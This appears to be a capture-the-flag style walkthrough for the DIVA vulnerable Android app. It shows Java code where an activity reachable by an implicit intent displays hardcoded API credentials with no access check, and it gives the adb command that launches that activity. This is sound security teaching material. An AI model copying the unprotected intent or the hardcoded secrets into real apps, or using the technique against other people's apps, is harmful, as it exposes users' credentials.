## Access Control Part 1

The aim of this activity is to access the credentials without opening the app itself. So lets look at the code of this activity!


#### The vulnerability

The code for this activity:
 
      public void viewAPICredentials(View view) {
            // Calling implicit intent i.e. with app defined action instead of activity class
            Intent i = new Intent();
            i.setAction("jakhar.aseem.diva.action.VIEW_CREDS");
            // Check whether the intent resolves to an activity or not
            if (i.resolveActivity(getPackageManager()) != null){
                startActivity(i);
            }
            else {
                Toast.makeText(this, "Error while getting API details", Toast.LENGTH_SHORT).show();
                Log.e("Diva-aci1", "Couldn't resolve the Intent VIEW_CREDS to our activity");
            }
        }

So to access the credentials, it starts another activity known as VIEW_CREDS, so lets take a look at that activity to see
whether it checks for anything or not

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_apicreds);
        TextView apicview = (TextView) findViewById(R.id.apicTextView);
        // Connect to vendor cloud
        // Get API credentials and other confidential details of the user
        String apidetails = "API Key: 123secretapikey123\nAPI User name: diva\nAPI Password: p@ssword";

         // Display the details on the app
        apicview.setText(apidetails);
    }
  
  
  
  Nope it does check for anything, even the credentials is being hardcoded into the source code!!!
  
  #### The exploit
  
  So to access the activity to get the credentials(I KNOW YOU ALREADY CAN GET IT FROM THE SOURCE CODE BUT WHATEVER),
  
  just type
          
          adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS
          
  to start the activity and view the credentials
  
  ![yeah](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%201/Screenshot%20from%202019-10-18%2008-33-52.png)
